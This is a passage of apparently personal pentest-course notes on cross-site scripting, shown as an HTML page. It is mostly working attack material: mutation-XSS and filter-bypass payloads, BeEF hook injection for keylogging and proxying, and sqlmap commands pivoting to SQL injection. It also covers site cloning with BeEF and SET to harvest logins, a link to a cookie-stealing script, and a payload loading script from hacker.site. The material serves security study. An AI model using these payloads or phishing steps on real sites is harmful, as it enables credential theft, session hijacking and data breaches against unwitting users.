  <li>In contrast, as with other browsers, it <strong>does not block</strong> javascript and data URI schemes within <strong>Bookmarks</strong>.</li>
</ul>

<h2 id="exotic-xss-vectors">Exotic XSS Vectors</h2>

<h3 id="mxss---mutation-based">mXSS - Mutation-Based</h3>
<ul>
  <li>This is a class of XSS vectors, which may occur in <strong>innerHTML</strong> and related FOM properties.</li>
  <li>With these kind of mutations, harmless string that clearly pass all XSS filters are transformed into XSS attack vectors by the browser layout engine itself.</li>
</ul>

<p>Its an old technique, works in IE8 or older</p>

<p>To test: http://html5sec.org/innerhtml</p>

<p>moreover: http://www.businessinfo.co.uk/labs/mxss/</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">listing</span><span class="o">&gt;&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="mi">1</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/listing</span><span class="err">&gt;
</span></code></pre></div></div>

<h2 id="create-an-external-ip-to-get-requests">Create an external IP to get requests</h2>
<p>You can use NGROK or localtunnel to open an external IP to receive cookies For example.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/inconshreveable/ngrok
https://github.com/localtunnel/localtunnel
</code></pre></div></div>

<p>This script can help to steal cookies:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://raw.githubusercontent.com/lnxg33k/misc/master/XSS-cookie-stealer.py
</code></pre></div></div>

<h2 id="notes-from-video">Notes from Video</h2>

<h3 id="1---keylogging">1 - Keylogging</h3>

<p>Metasploit:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service postgresql start
service metasploit start
<span class="sb">```</span>bash

DOM XSS:
<span class="sb">```</span>js
&lt;img/src<span class="o">=</span>x <span class="nv">style</span><span class="o">=</span><span class="s2">"display:none"</span> <span class="nv">onerror</span><span class="o">=</span><span class="s2">"s=document.createElement('script'); s.setAttribute('src','&lt;beef hook&gt;');document.head.appendChild(s)"</span><span class="o">&gt;</span>
</code></pre></div></div>

<h3 id="2---from-an-xss-to-a-sql-injection">2 - From an XSS to a SQL Injection</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BeEF <span class="o">&gt;</span> Rider <span class="o">&gt;</span> Forge Request
</code></pre></div></div>

<p>PoC XSS:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">span</span> <span class="nx">onmouseover</span><span class="o">=</span><span class="dl">"</span><span class="s2">console.info('sounds good')</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Great</span> <span class="nx">site</span><span class="o">&lt;</span><span class="sr">/span</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Inject the BeEF hook:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">random</span> <span class="nx">message</span><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">beef hook</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">in</span> <span class="nx">BeEF</span> <span class="o">&gt;</span> <span class="nx">click</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">target</span> <span class="nx">IP</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="k">as</span> <span class="nb">Proxy</span>
<span class="o">-</span> <span class="nx">configure</span> <span class="nx">a</span> <span class="nx">browser</span> <span class="nx">proxy</span> <span class="nx">such</span> <span class="k">as</span> <span class="nx">foxyproxy</span>
<span class="o">-</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">8080</span>
<span class="o">-</span> <span class="nx">ignore</span> <span class="nx">proxy</span> <span class="nx">For</span> <span class="nx">localhost</span><span class="p">,</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span><span class="p">,</span> <span class="o">&lt;</span><span class="nx">our</span> <span class="nx">ip</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>in BURP:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="nx">Options</span> <span class="o">&gt;</span> <span class="nx">Connections</span> <span class="o">&gt;</span> <span class="nx">Upstream</span> <span class="nb">Proxy</span> <span class="nx">Server</span>
<span class="o">-</span> <span class="nx">Destination</span> <span class="nx">Host</span><span class="p">:</span><span class="o">*</span>
<span class="o">-</span> <span class="nb">Proxy</span> <span class="nx">Host</span><span class="p">:</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span>
<span class="o">-</span> <span class="nb">Proxy</span> <span class="nx">Port</span><span class="p">:</span> <span class="mi">6789</span>

<span class="o">-</span> <span class="nx">Target</span> <span class="o">&gt;</span> <span class="nx">Scope</span>
<span class="o">-</span> <span class="nx">Host</span><span class="p">:</span> <span class="o">&lt;</span><span class="nx">target</span> <span class="nx">domain</span> <span class="nx">or</span> <span class="nx">IP</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>SQLMAP:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target url/search?rnd=a1a1&amp;name=a&gt;"</span> <span class="nt">-p</span> name <span class="nt">--proxy</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8080"</span> <span class="nt">--randomize</span> rnd <span class="nt">--dbms</span><span class="o">=</span>mysql <span class="nt">--technique</span><span class="o">=</span>U <span class="nt">--union-cols</span><span class="o">=</span>7-10 <span class="nt">--prefix</span> <span class="s2">"'"</span> <span class="nt">--sufix</span> <span class="s2">" # "</span> <span class="nt">--banner</span>
sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target url/search?rnd=a1a1&amp;name=a&gt;"</span> <span class="nt">-p</span> name <span class="nt">--proxy</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8080"</span> <span class="nt">--current-db</span>
sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target url/search?rnd=a1a1&amp;name=a&gt;"</span> <span class="nt">-p</span> name <span class="nt">--proxy</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8080"</span> <span class="nt">-D</span> &lt;name of the db&gt; <span class="nt">--tables</span>
sqlmap <span class="nt">-u</span> <span class="s2">"&lt;target url/search?rnd=a1a1&amp;name=a&gt;"</span> <span class="nt">-p</span> name <span class="nt">--proxy</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8080"</span> <span class="nt">-D</span> &lt;DBs name&gt; <span class="nt">-T</span> &lt;TABLEs name&gt; <span class="nt">--collums</span> 
</code></pre></div></div>

<h3 id="3---website-cloning">3 - Website Cloning</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># edit /etc/hosts &gt; add 127.0.0.1 cloned.test</span>
<span class="nb">cd</span> /etc/apache2/sites-available <span class="o">&gt;</span> <span class="nb">cp </span>default cloned.test

<span class="c"># edit clonet.test &gt; add ServerName cloned.test &gt; edit DocumentRoot /var/www/cloned.test</span>
a2ensite cloned.test
service apache2 reload

<span class="nb">cd</span> /var/www/cloned.test
<span class="nb">echo</span> <span class="s1">'Hello World'</span> <span class="o">&gt;</span> index.html
<span class="nb">test </span><span class="k">in </span>browser
</code></pre></div></div>

<h4 id="clone-with-wget">Clone with wget</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/www/cloned.test/
wget <span class="nt">-mK</span> <span class="nt">-nH</span> &lt;target site&gt;
</code></pre></div></div>

<h4 id="clone-with-beef">Clone with BeEF</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>beef <span class="nt">-x</span>
</code></pre></div></div>

<p>in shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Content-Type: application/json; charset=UTF-8"</span> <span class="se">\ </span><span class="nt">-d</span> <span class="s1">'{"url":"&lt;target URL&gt;", "mount":"/amazon"}'</span> <span class="se">\ </span><span class="nt">-X</span> POST http://127.0.0.1:3000/api/seng/clone_page?token<span class="o">=</span>&lt;API key from BeEF console&gt; 

- Go to the browser and visit the address
- localhost:3000/amazon
<span class="c"># with beef its cloned + its automaticaly hooked </span>
<span class="c"># If the user type anything like user:password it will be redirect to the original site and BeEF will capture any info</span>
</code></pre></div></div>

<p>in BeEF GUI:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Current Browser <span class="o">&gt;</span> Commands <span class="o">&gt;</span> Browser <span class="o">&gt;</span> Hooked Domain <span class="o">&gt;</span> Create Prompt Dialog
&lt;write something&gt; - Execute
</code></pre></div></div>

<h4 id="create-a-similar-targets-domain-with-urlcrazy">Create a Similar Targets Domain with URLCRAZY</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>urlcrazy &lt;target URL&gt;
</code></pre></div></div>

<h4 id="cloning-with-the-social-engineer-toolkit">Cloning with The Social-Engineer Toolkit</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setoolkit
</code></pre></div></div>

<p>in shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /usr/share/set/config<span class="p">;</span> 
<span class="nb">cp </span>set_config set_config.bkp
edit set_config <span class="o">&gt;</span> <span class="nv">APACHE_DIRECTORY</span><span class="o">=</span>/var/www/cloned.test
edit <span class="nv">HARVESTER_LOG</span><span class="o">=</span>/var/www/cloned.test/
</code></pre></div></div>

<p>in SET:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 - Social-Engineer Attacks
2 - Website Attack Vectors
3 - Credential Harvester Attack Method
2 - Site Cloner
<span class="c"># &lt;in real scenarios we need to configure an external IP address, in this case well skip&gt;</span>
<span class="c"># &lt;enter the URL to clone&gt;</span>
</code></pre></div></div>

<blockquote>
  <p>test in browser the cloned site</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/www/cloned.test/
edit index.html
add <span class="k">in </span>responseBody <span class="o">&gt;</span> <span class="o">(</span><span class="s2">"An error has occurred, Please Retry!"</span><span class="o">)</span><span class="p">;</span>
add setTimeout<span class="o">(</span><span class="k">function</span><span class="o">(){</span>document.location.href<span class="o">=</span><span class="s2">"&lt;the original URL of the target&gt;"</span><span class="p">;</span><span class="o">}</span>,2000<span class="o">)</span><span class="p">;</span>
clean other lines that are not useful to the code
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>post.php login.php 
<span class="c"># because the javascript want a login.php page</span>

insert login:password <span class="k">in </span>the <span class="nb">test </span>cloned site, it should redirect to the original after the try

go to /var/www/cloned.test/
<span class="nb">cat </span>harvester file 

<span class="c"># it should show the login:password captured</span>
</code></pre></div></div>

<h2 id="lab---11-levels-to-bypass-xss">Lab - 11 Levels to Bypass XSS</h2>

<h3 id="1---normal">1 - normal</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">l33t</span><span class="dl">"</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h3 id="2---bypass-script">2 - bypass script</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">l33t</span><span class="dl">"</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h3 id="3---no-script-allowed">3 - no script allowed</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">img</span><span class="o">/</span><span class="nx">src</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">l33t</span><span class="dl">"</span><span class="p">)</span><span class="o">&gt;</span>
</code></pre></div></div>

<h3 id="4---no-script--no-on-allowed">4 - no script / no ON allowed</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">svg</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="5---no-on-no-functions">5 - no ON, no functions</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">svg</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="o">&amp;</span><span class="nx">lpar</span><span class="p">;</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="o">&amp;</span><span class="nx">rpar</span><span class="p">;</span>
</code></pre></div></div>

<h3 id="6---no-alert">6 - no alert</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="err">\</span><span class="nf">u0061lert</span><span class="p">(</span><span class="dl">'</span><span class="s1">l33t</span><span class="dl">'</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h3 id="7---no-unicode-escaping--no-alert">7 - No Unicode escaping / no alert</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">eval</span><span class="p">(</span><span class="dl">'</span><span class="se">\</span><span class="s1">x61lert(</span><span class="se">\'</span><span class="s1">l33t</span><span class="se">\'</span><span class="s1">)</span><span class="dl">'</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h3 id="8---no-alert--no-products">8 - No alert / no products</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">NL</span><span class="p">]</span><span class="nf">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">x61lert(</span><span class="se">\'</span><span class="s1">l33t</span><span class="se">\'</span><span class="s1">)</span><span class="dl">'</span>
<span class="o">&lt;</span><span class="sr">/Title/</span><span class="o">&lt;</span><span class="sr">/script/</span><span class="o">&gt;&lt;</span><span class="nx">Input</span> <span class="nx">Type</span><span class="o">=</span><span class="nx">Text</span> <span class="nx">Style</span><span class="o">=</span><span class="nx">position</span><span class="p">:</span><span class="nx">fixed</span><span class="p">;</span><span class="nl">top</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="nl">left</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">font</span><span class="o">-</span><span class="nx">size</span><span class="p">:</span><span class="mi">999</span><span class="nx">px</span> <span class="o">*</span><span class="sr">/; Onmouseenter=confirm`l33t` /</span><span class="o">/&gt;</span><span class="err">#</span>
<span class="o">&lt;</span><span class="sr">/Title/</span><span class="o">&lt;</span><span class="sr">/script/</span><span class="o">&gt;&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="se">\</span><span class="s2">u0061lert('l33t')</span><span class="dl">"</span><span class="o">/&gt;</span><span class="err">#</span>
<span class="o">&lt;</span><span class="sr">/script&gt;&lt;svg onload="eval</span><span class="se">(</span><span class="sr">atob</span><span class="se">(</span><span class="sr">'YWxlcnQoJ2wzM3QnKQ=='</span><span class="se">))</span><span class="sr">"&gt;</span><span class="err"> 
</span></code></pre></div></div>

<h3 id="9---stronger-bypass---no-alert--no-products">9 - stronger bypass - no alert / no products</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="err">\</span><span class="nx">u2028</span><span class="p">]</span><span class="nf">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">x61lert(</span><span class="se">\'</span><span class="s1">l33t</span><span class="se">\'</span><span class="s1">)</span><span class="dl">'</span>
<span class="o">&lt;</span><span class="sr">/Title/</span><span class="o">&lt;</span><span class="sr">/script/</span><span class="o">&gt;&lt;</span><span class="nx">Input</span> <span class="nx">Type</span><span class="o">=</span><span class="nx">Text</span> <span class="nx">Style</span><span class="o">=</span><span class="nx">position</span><span class="p">:</span><span class="nx">fixed</span><span class="p">;</span><span class="nl">top</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="nl">left</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">font</span><span class="o">-</span><span class="nx">size</span><span class="p">:</span><span class="mi">999</span><span class="nx">px</span> <span class="o">*</span><span class="sr">/; Onmouseenter=confirm`l33t` /</span><span class="o">/&gt;</span><span class="err">#</span>
<span class="o">&lt;</span><span class="sr">/Title/</span><span class="o">&lt;</span><span class="sr">/script/</span><span class="o">&gt;&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="dl">"</span><span class="se">\</span><span class="s2">u0061lert('l33t')</span><span class="dl">"</span><span class="o">/&gt;</span><span class="err">#</span>
<span class="o">&lt;</span><span class="sr">/script&gt;&lt;svg onload="eval</span><span class="se">(</span><span class="sr">atob</span><span class="se">(</span><span class="sr">'YWxlcnQoJ2wzM3QnKQ=='</span><span class="se">))</span><span class="sr">"&gt;</span><span class="err"> 
</span></code></pre></div></div>

<h3 id="10---no-string--no-alert-">10 - no string / no alert /</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">eval</span><span class="p">(</span><span class="mi">8680439</span><span class="p">..</span><span class="nf">toString</span><span class="p">(</span><span class="mi">30</span><span class="p">))(</span><span class="mi">983801</span><span class="p">..</span><span class="nf">toString</span><span class="p">(</span><span class="mi">36</span><span class="p">))</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<h3 id="11---no-scripts--dont-break-src-tag">11 - no scripts / dont break src tag</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">:</span><span class="c1">//11.xss.labs%2f@hacker.site/X.js</span>
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#advanced" class="page__taxonomy-item" rel="tag">advanced</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#ewptx" class="page__taxonomy-item" rel="tag">ewptx</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-29T00:00:00+06:00">November 29, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=3+-+Cross-site+scripting+%28XSS%29%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxss%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxss%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fewptx%2Fxss%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/notes/ewptx/evasionbasics/" class="pagination--pager" title="2 - Evasion Basics
">Previous</a>
    
    
      <a href="/notes/ewptx/xssfilter/" class="pagination--pager" title="4 - XSS Filter Evasion
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">

    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
  
    <script src="/assets/js/clipboard.js"></script>
  



  </body>
</html>
